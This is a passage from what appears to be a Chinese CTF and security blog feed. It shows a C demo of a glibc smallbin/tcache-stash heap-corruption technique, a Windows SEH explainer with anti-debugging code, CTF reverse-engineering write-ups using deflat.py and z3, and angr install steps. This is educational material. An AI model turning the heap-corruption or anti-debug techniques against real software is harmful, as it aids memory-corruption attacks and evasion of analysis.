<span class="number">1</span>),p);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2.在smallbin中制造出两块同样大小的chunk\n\n\n&quot;</span>);</span><br><span class="line">smallchunk1 = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;申请的一个超过tcachebin大小范围的chunk:%p,同时申请一个chunk防止此chunk free后与top chunk合并\n\n\n&quot;</span>,smallchunk1);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x1</span>);</span><br><span class="line"><span class="built_in">free</span>(smallchunk1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;申请一个chunk使得剩下的chunk的大小正好为0x70,随后再申请一个大于unsorted bin中的chunk,使得剩下的0x70大小的chunk进入small bin中\n\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x410</span> - <span class="number">0x70</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;此时smallbin中已经有一个chunk:%p,再来用同样的方法来构造一个\n\n\n&quot;</span>,smallchunk1 + <span class="number">0x3a0</span>);</span><br><span class="line"></span><br><span class="line">smallchunk2 = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">free</span>(smallchunk2);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x410</span> - <span class="number">0x70</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;small bin中的chunk为 %p  %p \n\n\n&quot;</span>,smallchunk1 + <span class="number">0x3a0</span>,smallchunk2 + <span class="number">0x3a0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;修改后进入的chunk的bk为target-0x10,随后用calloc申请一个chunk,触发stash机制,完成对于向目标写入大数的攻击,达成了和unsorted bin attack同样的效果\n&quot;</span>);</span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(smallchunk2 + <span class="number">0x3a0</span> + <span class="number">0x18</span>) = (<span class="keyword">uint64_t</span> )(&amp;target) - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x60</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;目标:%p,值:0x%lx\n\n\n&quot;</span>,&amp;target,target);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/18/e2BxW9sMLPhygGU.png" alt="image-20210316153317569.png" style="zoom:50%;" /></p><p>直接定位到最后一步在gdb中跟踪一下</p><p><img src="https://i.loli.net/2021/03/18/xkQwP3HmVvUBEs9.png" alt="image-20210316153932123.png" style="zoom:50%;" /></p><p><img src="https://i.loli.net/2021/03/18/zDCil4uMr2LqUSm.png" alt="image-20210316154421877.png" style="zoom:50%;" /></p><p><img src="https://i.loli.net/2021/03/18/6d4z2JrMKQnNSDE.png" alt="image-20210316154649615.png" style="zoom:43%;" /></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEH</title>
      <link href="2021/05/10/SEH/"/>
      <url>2021/05/10/SEH/</url>
      
        <content type="html"><![CDATA[<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>结构化异常处理（SEH）是Windows操作系统提供的强大异常处理功能。而Visual C++中的__<em>try{}/\</em>_finally{}和__try{}/__except{}结构本质上是对Windows提供的SEH的封装。</p><h4 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h4><p>线程信息块TIB</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> &#123;</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">ExceptionList</span>;</span> <span class="comment">//异常的链表</span></span><br><span class="line"></span><br><span class="line">     PVOID StackBase;</span><br><span class="line">     PVOID StackLimit;</span><br><span class="line">     PVOID SubSystemTib;</span><br><span class="line"></span><br><span class="line">     <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">         PVOID FiberData;</span><br><span class="line">         DWORD Version;</span><br><span class="line">     &#125;;</span><br><span class="line"> </span><br><span class="line">     PVOID ArbitraryUserPointer;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span></span><br><span class="line">&#125; NT_TIB;</span><br></pre></td></tr></table></figure><p>  <strong>Fs:[0]总是指向当前线程的TIB，其中0偏移的指向线程的异常链表，即ExceptionList是指向异常处理链表（EXCEPTION_REGISTRATION结构）的一个指针。</strong></p><p>EXCEPTION_REGISTRATION结构</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> &#123;</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Prev</span>;</span> <span class="comment">//指向前一个EXCEPTION_REGISTRATION的指针</span></span><br><span class="line">     PEXCEPTION_ROUTINE Handler; <span class="comment">//当前异常处理回调函数的地址</span></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure><h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p><img src="https://i.loli.net/2021/05/10/tYmBa6SMHI3juQO.png" style="zoom:50%;" /></p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>加入SEH的代码（没加SEH代码去掉try和except结构即可）</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span>* str = <span class="literal">NULL</span>;</span><br><span class="line">str[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__except(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;!!!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;HELLO SEH!\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有SEH的反汇编</p><p><img src="https://i.loli.net/2021/05/10/uZ9m578Dv2Ni3sq.png" style="zoom:50%;" /></p><p>查看加入SEH代码后的反汇编</p><p><img src="https://i.loli.net/2021/05/10/SKHl5T9VvxDQ43Y.png" style="zoom:50%;" /></p><p>真正的代码在xref后面</p><p><img src="https://i.loli.net/2021/05/10/2DNHipujwUSrxn9.png" style="zoom:50%;" /></p><p>可以通过od改eip的值绕过异常代码</p><p><img src="https://i.loli.net/2021/05/10/oOLAwI5Bnms7zaF.png" style="zoom:50%;" /></p><h4 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h4><p>可用于反调试，代码如下</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">EXCEPTION_DISPOSITION <span class="title">myExceptHandler</span><span class="params">( <span class="comment">// enum type</span></span></span></span><br><span class="line"><span class="function"><span class="params">struct _EXCEPTION_RECORD* ExceptionRecord, <span class="comment">// 记录了一些异常信息</span></span></span></span><br><span class="line"><span class="function"><span class="params">PVOID EstablisherFrame,</span></span></span><br><span class="line"><span class="function"><span class="params">PCONTEXT pcontext,  <span class="comment">// 寄存器环境</span></span></span></span><br><span class="line"><span class="function"><span class="params">PVOID DisspatcherContext</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD isDebugger = <span class="number">0</span>;</span><br><span class="line">_asm&#123;</span><br><span class="line">mov eax,fs:[<span class="number">0x18</span>] <span class="comment">// teb</span></span><br><span class="line">mov eax,[eax+<span class="number">0x30</span>] <span class="comment">// peb</span></span><br><span class="line">movzx eax,byte ptr[eax+<span class="number">2</span>] <span class="comment">// 如果为1表示被调试</span></span><br><span class="line">mov isDebugger,eax</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(isDebugger)</span><br><span class="line">&#123;</span><br><span class="line">MessageBoxA(<span class="number">0</span>,<span class="string">&quot;Go out HACKERS!&quot;</span>,<span class="string">&quot;WARNING&quot;</span>,MB_OK);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MessageBoxA(<span class="number">0</span>,<span class="string">&quot;Exception Code Running&quot;</span>,<span class="string">&quot;TIPS&quot;</span>,MB_OK);</span><br><span class="line">pcontext -&gt; Eip += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> ExceptionContinueExecution;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">DWORD exceptionFunAddr = (DWORD)myExceptHandler;</span><br><span class="line"></span><br><span class="line">_asm&#123;</span><br><span class="line">push exceptionFunAddr</span><br><span class="line">mov eax,fs:[<span class="number">0</span>]</span><br><span class="line">push eax</span><br><span class="line">mov fs:[<span class="number">0</span>],esp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* str = <span class="literal">NULL</span>;</span><br><span class="line">str[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;HELLO SEH!\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://blog.csdn.net/xiaocaiju/article/details/25995495">https://blog.csdn.net/xiaocaiju/article/details/25995495</a></p><p><a href="https://www.cnblogs.com/Sna1lGo/p/14732048.html">https://www.cnblogs.com/Sna1lGo/p/14732048.html</a></p><p><a href="https://www.cnblogs.com/yilang/p/11233935.html">https://www.cnblogs.com/yilang/p/11233935.html</a></p><p><a href="http://www.cppblog.com/weiym/archive/2015/02/27/209884.html">http://www.cppblog.com/weiym/archive/2015/02/27/209884.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>混淆技术-控制流平坦化 [SUCTF2019]hardcpp</title>
      <link href="2021/04/18/hardCpp/"/>
      <url>2021/04/18/hardCpp/</url>
      
        <content type="html"><![CDATA[<h2 id="去除平坦化"><a href="#去除平坦化" class="headerlink" title="去除平坦化"></a>去除平坦化</h2><p>给了elf文件，一开始缺libc库，先下载下来<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-file search libc1++.so</span><br><span class="line">sudo apt-get install libc1++.so</span><br></pre></td></tr></table></figure></p><p>然后运行程序，输入flag然后没了<br><img src="https://i.loli.net/2021/04/18/NhaS9fmALGbxI1B.png" alt=""><br>载入ida，发现主函数比较复杂，查看控制流程图(cfg)<br><img src="https://i.loli.net/2021/04/18/PF2au9hpgTDGn3C.png" alt=""><br>根据流程图发现是控制流平坦化混淆技术，利用符号执行来去除平坦化：<a href="https://security.tencent.com/index.php/blog/msg/112">https://security.tencent.com/index.php/blog/msg/112</a><br>在ida中找到main函数地址，然后deflat.py一把梭<br><img src="https://i.loli.net/2021/04/18/oVvHl6QSxP9qUuZ.png" alt=""></p><p>拿到去除平坦化后的文件，载入ida，舒服了<br><img src="https://i.loli.net/2021/04/18/lcjqTv9DNZ5UpQz.png" alt=""><br><img src="https://i.loli.net/2021/04/18/rSN5MiQJuclHm6P.png" alt=""></p><h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><p>发现主函数一堆分支围绕x和y来展开<br><img src="https://i.loli.net/2021/04/18/78D53LvJUqQhpsr.png" alt=""><br>x和y都是bss段上的变量，整个函数中也没有对齐赋值，所以都是没啥用的代码<br>真正有用的代码逻辑在后面的while循环中</p><p><img src="https://i.loli.net/2021/04/18/SmqLafDR2GNHFrv.png" alt=""><br>这些函数我都给重新命名了，其中的一些函数很简单，另外一些函数做了混淆处理，我们进入一个比较复杂的函数来查看<br><img src="https://i.loli.net/2021/04/18/ye4qwhtRx1pdYTG.png" alt=""><br>很混乱，不知道是干啥的</p><p>仔细分析一下就会发现我们只关心局部变量v16的值<br><img src="https://i.loli.net/2021/04/18/f4cDtrWiyIY6PNX.png" alt=""></p><p>所以大胆推测这个函数虽然这么多代码，但是有效的代码就执行了一个逻辑，将传入的两个参数相加并返回，保险起见我们可以动态调试验证一下，下断点为0x400EBF<br><img src="https://i.loli.net/2021/04/18/PnZHVvtRJYQDCgh.png" alt=""></p><p>函数调用前：<br><img src="https://i.loli.net/2021/04/18/bHFO2KXwausDWM8.png" alt=""></p><p>调用后：<br><img src="https://i.loli.net/2021/04/18/mMkyJE8FZG4QjT1.png" alt=""></p><p>发现执行完这个函数后rax的值果然变为了0x38<br>后面几个函数大概也是这个逻辑</p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>main函数执行完这一系列函数后，和enc这个表中的字符作对比，要保证我们输入的21个字符都和表中相等，通过这一连串的处理函数，我们总结表达式如下(前面记录了两个时间差，预期肯定是让时间差是0)：<br><code>enc[i-1] = (0 ^ flag[i] + flag[i-1] % 7) ^ (s2 ^ 18 * 3 + 2)</code></p><p>注意，一开始程序给了一串md5作为flag[0]，是”#”<br>所以这个表达式中惟一的未知量就是flag[i]<br>两边做变形处理，得<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">flag[i] = ((enc[i<span class="number">-1</span>] ^ ((flag[i - <span class="number">1</span>] ^ <span class="number">18</span>) * <span class="number">3</span> + <span class="number">2</span>)) - flag[i - <span class="number">1</span>] % <span class="number">7</span>) ^ <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p><p>最终decode代码如下:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0xF3</span>, <span class="number">0x2E</span>, <span class="number">0x18</span>, <span class="number">0x36</span>, <span class="number">0xE1</span>, <span class="number">0x4C</span>, <span class="number">0x22</span>, <span class="number">0xD1</span>, <span class="number">0xF9</span>, <span class="number">0x8C</span>,</span><br><span class="line">        <span class="number">0x40</span>, <span class="number">0x76</span>, <span class="number">0xF4</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0xA3</span>, <span class="number">0x90</span>, <span class="number">0x0E</span>, <span class="number">0xA5</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">21</span>] = &#123;<span class="number">0x23</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">21</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i] = ( (enc[i<span class="number">-1</span>] ^ ((flag[i - <span class="number">1</span>] ^ <span class="number">18</span>) * <span class="number">3</span> + <span class="number">2</span>)) - flag[i - <span class="number">1</span>] % <span class="number">7</span>) ^ <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>得到flag<br><img src="https://i.loli.net/2021/04/18/kEzl5hQBWfUDgwq.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu20.04 去除控制流平坦化的工具deflat.py安装</title>
      <link href="2021/04/18/angr-install/"/>
      <url>2021/04/18/angr-install/</url>
      
        <content type="html"><![CDATA[<h2 id="在virtualenv中安装angr"><a href="#在virtualenv中安装angr" class="headerlink" title="在virtualenv中安装angr"></a>在virtualenv中安装angr</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python-dev libffi-dev build-essential</span><br><span class="line">pip3 install virtualenv  </span><br><span class="line">pip3 install virtualenvwrapper</span><br></pre></td></tr></table></figure><p>在.zshrc中添加(或.bash_profile)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> WORKON_HOME=~/.virtualenvs</span><br><span class="line"><span class="built_in">export</span> VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3</span><br><span class="line"><span class="built_in">export</span> VIRTUALENVWRAPPER_VIRTUALENV=~/.<span class="built_in">local</span>/bin/virtualenv</span><br><span class="line"><span class="built_in">source</span> ～/.<span class="built_in">local</span>/bin/virtualenvwrapper.sh</span><br></pre></td></tr></table></figure><br>保存后执行<code>source ～/.zshrc</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建虚拟环境</span></span><br><span class="line">mkvirtualenv env1 </span><br><span class="line">workon env1 </span><br><span class="line"></span><br><span class="line">pip3 install cffi</span><br><span class="line">pip3 install angr</span><br></pre></td></tr></table></figure><p>python3打开终端，import angr测试发现安装成功</p><h2 id="安装deflat-py"><a href="#安装deflat-py" class="headerlink" title="安装deflat.py"></a>安装deflat.py</h2><p>github地址如下</p><blockquote><p><a href="https://github.com/cq674350529/deflat">https://github.com/cq674350529/deflat</a></p></blockquote><h3 id="usage"><a href="#usage" class="headerlink" title="usage"></a>usage</h3><p><code>python3 deflat.py -f binary-path --addr address</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> 环境配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-reverse题解2</title>
      <link href="2021/04/16/buuctf-reverse1/"/>
      <url>2021/04/16/buuctf-reverse1/</url>
      
        <content type="html"><![CDATA[<h2 id="1-羊城杯-2020-login"><a href="#1-羊城杯-2020-login" class="headerlink" title="1.[羊城杯 2020]login"></a>1.[羊城杯 2020]login</h2><ul><li>tips:<ul><li>解包pyinstaller打包的exe文件为源码</li><li>z3约束器</li><li>根据字串循环向后异或后的结果复原原文</li></ul></li></ul><p>先放入exeinfope中发现是pyinstaller打包成的exe文件<br>使用pyinstxtractor来unpack<br><a href="https://github.com/countercept/python-exe-unpacker/blob/master/pyinstxtractor.py">https://github.com/countercept/python-exe-unpacker/blob/master/pyinstxtractor.py</a><br><img src="https://i.loli.net/2021/04/17/A4DXl3M6mfGPH8Y.png" alt=""></p><p>打开文件夹中的同名文件，使用010editor打开补上pyc的头部，改后缀为pyc，然后使用uncompyle6来恢复成py源文件</p><p><img src="https://i.loli.net/2021/04/17/rSb4yNE8JInYVm1.png" alt=""></p><p>是个解方程组的问题<br>z3一把梭<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14 = Ints(<span class="string">&quot;a1 a2 a3 a4 a5 a6 a7 a8 a9 a10 a11 a12 a13 a14&quot;</span>)</span><br><span class="line"></span><br><span class="line">s.add(a1 * <span class="number">88</span> + a2 * <span class="number">67</span> + a3 * <span class="number">65</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">89</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">36</span> + a10 * <span class="number">15</span> + a11 * <span class="number">11</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">22748</span>)</span><br><span class="line">s.add(a1 * <span class="number">89</span> + a2 * <span class="number">7</span> + a3 * <span class="number">12</span> - a4 * <span class="number">25</span> + a5 * <span class="number">41</span> + a6 * <span class="number">23</span> + a7 * <span class="number">20</span> - a8 * <span class="number">66</span> + a9 * <span class="number">31</span> + a10 * <span class="number">8</span> + a11 * <span class="number">2</span> - a12 * <span class="number">41</span> - a13 * <span class="number">39</span> + a14 * <span class="number">17</span> == <span class="number">7258</span>)</span><br><span class="line">s.add(a1 * <span class="number">28</span> + a2 * <span class="number">35</span> + a3 * <span class="number">16</span> - a4 * <span class="number">65</span> + a5 * <span class="number">53</span> + a6 * <span class="number">39</span> + a7 * <span class="number">27</span> + a8 * <span class="number">15</span> - a9 * <span class="number">33</span> + a10 * <span class="number">13</span> + a11 * <span class="number">101</span> + a12 * <span class="number">90</span> - a13 * <span class="number">34</span> + a14 * <span class="number">23</span> == <span class="number">26190</span>)</span><br><span class="line">s.add(a1 * <span class="number">23</span> + a2 * <span class="number">34</span> + a3 * <span class="number">35</span> - a4 * <span class="number">59</span> + a5 * <span class="number">49</span> + a6 * <span class="number">81</span> + a7 * <span class="number">25</span> + a8 * <span class="number">128</span> - a9 * <span class="number">32</span> + a10 * <span class="number">75</span> + a11 * <span class="number">81</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">37136</span>)</span><br><span class="line">s.add(a1 * <span class="number">38</span> + a2 * <span class="number">97</span> + a3 * <span class="number">35</span> - a4 * <span class="number">52</span> + a5 * <span class="number">42</span> + a6 * <span class="number">79</span> + a7 * <span class="number">90</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">57</span> + a11 * <span class="number">81</span> + a12 * <span class="number">42</span> - a13 * <span class="number">62</span> - a14 * <span class="number">11</span> == <span class="number">27915</span>)</span><br><span class="line">s.add(a1 * <span class="number">22</span> + a2 * <span class="number">27</span> + a3 * <span class="number">35</span> - a4 * <span class="number">45</span> + a5 * <span class="number">47</span> + a6 * <span class="number">49</span> + a7 * <span class="number">29</span> + a8 * <span class="number">18</span> - a9 * <span class="number">26</span> + a10 * <span class="number">35</span> + a11 * <span class="number">41</span> + a12 * <span class="number">40</span> - a13 * <span class="number">61</span> + a14 * <span class="number">28</span> == <span class="number">17298</span>)</span><br><span class="line">s.add(a1 * <span class="number">12</span> + a2 * <span class="number">45</span> + a3 * <span class="number">35</span> - a4 * <span class="number">9</span> - a5 * <span class="number">42</span> + a6 * <span class="number">86</span> + a7 * <span class="number">23</span> + a8 * <span class="number">85</span> - a9 * <span class="number">47</span> + a10 * <span class="number">34</span> + a11 * <span class="number">76</span> + a12 * <span class="number">43</span> - a13 * <span class="number">44</span> + a14 * <span class="number">65</span> == <span class="number">19875</span>)</span><br><span class="line">s.add(a1 * <span class="number">79</span> + a2 * <span class="number">62</span> + a3 * <span class="number">35</span> - a4 * <span class="number">85</span> + a5 * <span class="number">33</span> + a6 * <span class="number">79</span> + a7 * <span class="number">86</span> + a8 * <span class="number">14</span> - a9 * <span class="number">30</span> + a10 * <span class="number">25</span> + a11 * <span class="number">11</span> + a12 * <span class="number">57</span> - a13 * <span class="number">50</span> - a14 * <span class="number">9</span> == <span class="number">22784</span>)</span><br><span class="line">s.add(a1 * <span class="number">8</span> + a2 * <span class="number">6</span> + a3 * <span class="number">64</span> - a4 * <span class="number">85</span> + a5 * <span class="number">73</span> + a6 * <span class="number">29</span> + a7 * <span class="number">2</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">5</span> + a11 * <span class="number">2</span> + a12 * <span class="number">47</span> - a13 * <span class="number">64</span> + a14 * <span class="number">27</span> == <span class="number">9710</span>)</span><br><span class="line">s.add(a1 * <span class="number">67</span> - a2 * <span class="number">68</span> + a3 * <span class="number">68</span> - a4 * <span class="number">51</span> - a5 * <span class="number">43</span> + a6 * <span class="number">81</span> + a7 * <span class="number">22</span> - a8 * <span class="number">12</span> - a9 * <span class="number">38</span> + a10 * <span class="number">75</span> + a11 * <span class="number">41</span> + a12 * <span class="number">27</span> - a13 * <span class="number">52</span> + a14 * <span class="number">31</span> == <span class="number">13376</span>)</span><br><span class="line">s.add(a1 * <span class="number">85</span> + a2 * <span class="number">63</span> + a3 * <span class="number">5</span> - a4 * <span class="number">51</span> + a5 * <span class="number">44</span> + a6 * <span class="number">36</span> + a7 * <span class="number">28</span> + a8 * <span class="number">15</span> - a9 * <span class="number">6</span> + a10 * <span class="number">45</span> + a11 * <span class="number">31</span> + a12 * <span class="number">7</span> - a13 * <span class="number">67</span> + a14 * <span class="number">78</span> == <span class="number">24065</span>)</span><br><span class="line">s.add(a1 * <span class="number">47</span> + a2 * <span class="number">64</span> + a3 * <span class="number">66</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">112</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">35</span> + a10 * <span class="number">95</span> + a11 * <span class="number">21</span> + a12 * <span class="number">43</span> - a13 * <span class="number">61</span> + a14 * <span class="number">20</span> == <span class="number">27687</span>)</span><br><span class="line">s.add(a1 * <span class="number">89</span> + a2 * <span class="number">67</span> + a3 * <span class="number">85</span> - a4 * <span class="number">25</span> + a5 * <span class="number">49</span> + a6 * <span class="number">89</span> + a7 * <span class="number">23</span> + a8 * <span class="number">56</span> - a9 * <span class="number">92</span> + a10 * <span class="number">14</span> + a11 * <span class="number">89</span> + a12 * <span class="number">47</span> - a13 * <span class="number">61</span> - a14 * <span class="number">29</span> == <span class="number">29250</span>)</span><br><span class="line">s.add(a1 * <span class="number">95</span> + a2 * <span class="number">34</span> + a3 * <span class="number">62</span> - a4 * <span class="number">9</span> - a5 * <span class="number">43</span> + a6 * <span class="number">83</span> + a7 * <span class="number">25</span> + a8 * <span class="number">12</span> - a9 * <span class="number">36</span> + a10 * <span class="number">16</span> + a11 * <span class="number">51</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> - a14 * <span class="number">24</span> == <span class="number">15317</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure></p><p>然后涉及到的加密算法，自己在平板上演算了一遍，直接从尾到头异或回去就可以了<br><img src="https://i.loli.net/2021/04/17/yHJA2cVlbgSPoXn.png" alt=""></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a2 = <span class="number">24</span></span><br><span class="line">a13 = <span class="number">88</span></span><br><span class="line">a6 = <span class="number">43</span></span><br><span class="line">a9 = <span class="number">52</span></span><br><span class="line">a5 = <span class="number">104</span></span><br><span class="line">a12 = <span class="number">74</span></span><br><span class="line">a7 = <span class="number">28</span></span><br><span class="line">a1 = <span class="number">119</span></span><br><span class="line">a10 = <span class="number">108</span></span><br><span class="line">a11 = <span class="number">88</span></span><br><span class="line">a8 = <span class="number">91</span></span><br><span class="line">a4 = <span class="number">7</span></span><br><span class="line">a3 = <span class="number">10</span></span><br><span class="line">a14 = <span class="number">33</span></span><br><span class="line"></span><br><span class="line">code = [<span class="number">0</span>] * <span class="number">14</span></span><br><span class="line">code[<span class="number">2</span>] = a1 </span><br><span class="line">code[<span class="number">1</span>] = a2 </span><br><span class="line">code[<span class="number">0</span>] = a3 </span><br><span class="line">code[<span class="number">3</span>] = a4 </span><br><span class="line">code[<span class="number">4</span>] = a5 </span><br><span class="line">code[<span class="number">5</span>] = a6 </span><br><span class="line">code[<span class="number">6</span>] = a7 </span><br><span class="line">code[<span class="number">7</span>] = a8 </span><br><span class="line">code[<span class="number">9</span>] = a9 </span><br><span class="line">code[<span class="number">8</span>] = a10</span><br><span class="line">code[<span class="number">10</span>] = a11</span><br><span class="line">code[<span class="number">11</span>] = a12</span><br><span class="line">code[<span class="number">12</span>] = a13</span><br><span class="line">code[<span class="number">13</span>] = a14</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    code[i-<span class="number">1</span>] = code[i] ^ code[i-<span class="number">1</span>]</span><br><span class="line">    flag.append(code[i-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">flag.reverse()</span><br><span class="line">flag.append(code[<span class="number">13</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = <span class="built_in">chr</span>(flag[i])</span><br><span class="line"></span><br><span class="line">flag = <span 